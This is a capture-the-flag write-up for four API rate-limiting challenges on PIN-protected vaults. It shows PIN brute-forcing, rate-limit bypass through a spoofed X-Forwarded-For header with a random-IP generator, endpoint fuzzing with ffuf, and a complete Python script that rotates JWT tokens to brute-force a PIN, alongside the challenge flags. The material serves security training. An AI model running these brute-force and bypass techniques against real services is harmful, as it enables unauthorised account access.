## Rate My API

### Rate Unlimited  

Designed By: MikeHacksThings - Maltek Solutions  
Points: 50 Create Task

Welcome to the world's most vulnerable password vault – no rate limiting in sight!  
This challenge presents a simple password vault protected by a 4-digit PIN. The catch? The developers forgot to implement any rate limiting whatsoever, making it the perfect target for a brute force attack.  
Your mission: Write a script to systematically try all possible PINs until you find the correct one, then access the vault to retrieve the flag. Can you automate your way through 10,000 possibilities to crack the code?

[https://rate-unlimited.ac25.apisecuniversity.com](https://rate-unlimited.ac25.apisecuniversity.com)

The homepage displayed a PIN input to unlock the vault.

![](imagens/2025-05-24_16-52.png)

I analyzed the request and, knowing it was a 4-digit code, I figured it was possible to brute-force it.

![](imagens/2025-05-24_16-53.png)

![](imagens/2025-05-24_16-55.png)

I used **Caido** to perform a brute-force attack on the `pin` parameter.

![](imagens/2025-05-24_17-14.png)

I added a half-second delay to avoid rate limiting.

![](imagens/2025-05-24_17-09.png)

```  
5759  
```  

![](imagens/2025-05-24_17-16.png)

```json  
flag{br00t3_f0rc3_w1th0ut_r4t3_l1m1ts}  
```

### Rate Limited  

Designed By: MikeHacksThings - Maltek Solutions  
Points: 100 Create Task

Think you're clever with your brute force attacks? We've added rate limiting to our vault! This challenge presents a password vault protected by a 4-digit PIN, but this time with IP-based rate limiting to prevent brute force attacks. Your mission: Analyze the rate limiting mechanism, identify its weakness, and bypass it to access the vault and retrieve the flag.

[https://rate-limited.ac25.apisecuniversity.com](https://rate-limited.ac25.apisecuniversity.com)

This challenge limits the number of incorrect PIN attempts before a temporary lockout occurs. This lockout appears to be based on IP, so depending on how it's configured, it can be bypassed by the "X-Forwarded-For" header that indicates the origin IP of the request.

For this, I created a wordlist of random IPs that will run alongside the bruteforce.

```shell
for i in {1..10000}; do echo "$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"; done > iplist.txt
```

With that, I started the attack with Caido, in the Automate module, running in parallel.

![](imagens/2025-05-24_17-43.png)

This way, it was possible to bypass the rate limit and quickly find the correct pin.

![](imagens/2025-05-24_17-39.png)

```
1627
```

After entering the PIN, I was able to receive the flag.

![](imagens/2025-05-24_17-47.png)

```json
flag{x_f0rw4rd3d_f0r_byp4ss}
```


### Rate Advanced  

Designed By: MikeHacksThings - Maltek Solutions  
Points: 150 Create Task

We've upgraded our security! Our vault now uses sophisticated token-based rate limiting. This challenge presents a password vault protected by a 4-digit PIN with advanced token-based rate limiting and session management. Your mission: Analyze the token management system, find its weakness, and exploit it to bypass the rate limiting and access the vault to retrieve the flag.

[https://rate-advanced.ac25.apisecuniversity.com](https://rate-advanced.ac25.apisecuniversity.com)

This time it was necessary to find a valid token in order to send a PIN. There was no visible way to acquire the token, only a hint saying that a session token was required.

![](imagens/2025-05-24_17-49.png)

Although the hint practically told me where to get the token, I decided to enumerate the API trying to find some new endpoint.

```shell  
ffuf -u https://rate-advanced.ac25.apisecuniversity.com/api/FUZZ -mc all -w API_wordlist -k -X POST -fc 404,503  
```

![](imagens/2025-05-22_22-48.png)

```  
/api/session  
```

By sending a POST request to this endpoint, a session token was received. This token was valid only for 30 minutes and limited to 5 attempts.

![](imagens/2025-05-24_17-56.png)

Here I got stuck for quite a while trying to bypass this limitation. I tried to automate acquiring a new token every 5 attempts, but there was also a limitation on token acquisition that made the process very slow.

After a lot of head-scratching, I remembered there are 2 steps for sending the PIN.

![](imagens/2025-05-24_17-59.png)

The first step was to verify the PIN and the second to access the vault. The requests were similar but for different endpoints.

![](imagens/2025-05-24_18-02.png)

So I decided to try brute forcing the vault opening by doing brute force on "/api/vault" adding the previously acquired token as the `X-Session-Token` header.

![](imagens/2025-05-24_18-14.png)

This way I was able to find the correct PIN.

![](imagens/2025-05-24_18-12.png)

And verify the flag directly in the request response.

![](imagens/2025-05-24_18-15.png)

### Rate Quantum  

Designed By: MikeHacksThings - Maltek Solutions  
Points: 250 Create Task

Welcome to the cutting edge of security! Our vault now employs quantum-inspired distributed rate limiting.

This challenge presents a password vault protected by a 4-digit PIN with a sophisticated multi-node rate limiting system and JWT-based authentication.

Your mission: Analyze the quantum token system, discover its vulnerabilities, and exploit them to bypass the distributed rate limiting and access the vault to retrieve the flag.

[https://rate-quantum.ac25.apisecuniversity.com](https://rate-quantum.ac25.apisecuniversity.com)

Here it got complex and I needed a little help from AI. I understood the mechanism of nodes and token usage. Every 3 failed attempts, it was necessary to renew the JWT token and rotate the nodes.

![](imagens/2025-05-24_18-21.png)

The PIN submission process worked as follows:

1 - Acquiring the JWT token

A request is made to the endpoint "/api/quantum-session", which returns a JWT token valid for 30 minutes.

![](imagens/2025-05-24_18-22.png)

2 - Checking the Node

A second request is made, sending the acquired token to "/api/inspect-token", to verify its validity and which node the token is attached to.

![](imagens/2025-05-24_18-25.png)

3 - Then the request with the PIN attempt can be made.

![](imagens/2025-05-24_18-33.png)

4 - After 3 attempts, it is necessary to perform the token rotation using the "rotate token" option:

![](imagens/2025-05-24_20-48.png)

![](imagens/2025-05-24_20-48_1.png)

After some testing, I noticed that the endpoint "/api/quantum-session" has rate-limit protection, but "/api/rotate-token" does not!

So, for brute forcing, what matters is an initial token from "/api/quantum-session", which every 3 attempts needs to be renewed through "/api/rotate-token", thus updating the Node and token.

For this, I took all these requests, organized a flow, and asked AI to help me write a python script with the sequence of instructions:

- An initial token that I would write directly in the script  
- Perform 3 PIN attempts  
- Token renewal via "/api/rotate-token" and check the Node used  
- Repeat the attempt and renewal flow until the PIN is found  

Script created:

```python
import requests
import time

BASE_URL = "https://rate-quantum.ac25.apisecuniversity.com"
INITIAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjE1Ni41OS4xOTMuNDMiLCJ0b2tlbklkIjoiMWJjOTI5Yi04MTRlMmFlMSIsIm5vZGVJZCI6MiwiY3JlYXRlZCI6MTc0ODEzMDkwNDM3MiwiYXR0ZW1wdHMiOjAsImxhc3RBdHRlbXB0IjowLCJpYXQiOjE3NDgxMzA5MDQsImV4cCI6MTc0ODEzMjcwNH0.WyLHn7LJ0HSrAKYbZbYK5vTA97sJQZ3q2tpyQHrrvyU"  # seu token inicial aqui

HEADERS_COMMON = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": f"{BASE_URL}/",
    "Origin": BASE_URL,
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

def rotate_token(current_token):
    headers = HEADERS_COMMON.copy()
    headers["X-Quantum-Token"] = current_token
    response = requests.post(f"{BASE_URL}/api/rotate-token", headers=headers)
    return response.json()["token"]

def get_node_id(token):
    headers = HEADERS_COMMON.copy()
    headers["X-Quantum-Token"] = token
    response = requests.post(f"{BASE_URL}/api/inspect-token", headers=headers)
    return response.json()["tokenInfo"]["nodeId"]

def try_pin(token, pin):
    headers = HEADERS_COMMON.copy()
    headers["X-Quantum-Token"] = token
    headers["Content-Type"] = "application/json"
    data = {"pin": pin}
    response = requests.post(f"{BASE_URL}/api/quantum-verify", json=data, headers=headers)
    try:
        result = response.json()
        if result.get("success") and "Invalid" not in result.get("message", ""):
            print(f"[+] PIN encontrado: {pin}")
            print(result)
            return True
    except Exception:
        pass
    return False

def brute_force():
    current_token = INITIAL_TOKEN
    attempt_count = 0
    for i in range(676,10000):
        pin = f"{i:04d}"

        if attempt_count == 0 or attempt_count >= 3:
            current_token = rotate_token(current_token)
            node_id = get_node_id(current_token)
            attempt_count = 0
            print(f"[i] Novo token e nodeId obtidos: nodeId={node_id}")

        print(f"[>] Testando PIN: {pin}")
        if try_pin(current_token, pin):
            break

        attempt_count += 1
        time.sleep(0.5)  # evitar rate limit

if __name__ == "__main__":
    brute_force()

```

Running the script, I was able to find the correct PIN.

![](imagens/2025-05-22_01-27.png)

```
2508
```

![](imagens/2025-05-22_01-26.png)

```json
flag{qu4ntum_t0k3n_f0rg3ry_m4st3r}
```
